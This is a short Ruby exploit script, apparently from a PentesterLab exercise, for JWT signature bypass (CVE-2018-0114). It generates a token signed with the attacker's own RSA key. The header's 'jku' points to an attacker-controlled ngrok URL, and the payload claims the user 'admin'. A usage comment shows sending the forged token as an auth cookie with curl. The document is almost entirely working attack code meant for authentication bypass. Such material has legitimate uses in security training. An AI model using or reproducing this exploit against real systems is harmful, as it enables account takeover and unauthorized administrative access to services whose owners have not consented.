# run on linux `openssl genrsa -out private.pem 2048`
# use `curl -H "Cookie: auth=$(ruby cve-2018-0114-jwk.rb)" URL`
require 'openssl'
require 'base64'
require 'json'

priv=OpenSSL::PKey::RSA.new File.read 'private.pem'

pub = priv.public_key
n=Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e=Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

# header={"alg"=>"RS256","jwk"=>{"kty"=>"RSA","kid"=>"pentesterlab","use"=>"sig", "n"=>n,"e"=>e}}
header = {"typ":"JWT","alg":"RS256","jku":"https://f3e6-73-129-14-72.ngrok.io/mykey.json"}

# payload = Base64.urlsafe_encode64("admin").gsub(/=+$/,"")
payload = {"user":"admin","iat": 1637380130}

pay = Base64.urlsafe_encode64(payload.to_json).gsub(/=+$/,"")
token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")+"."+pay
sign = priv.sign("SHA256",token)
# puts header
puts token+"."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")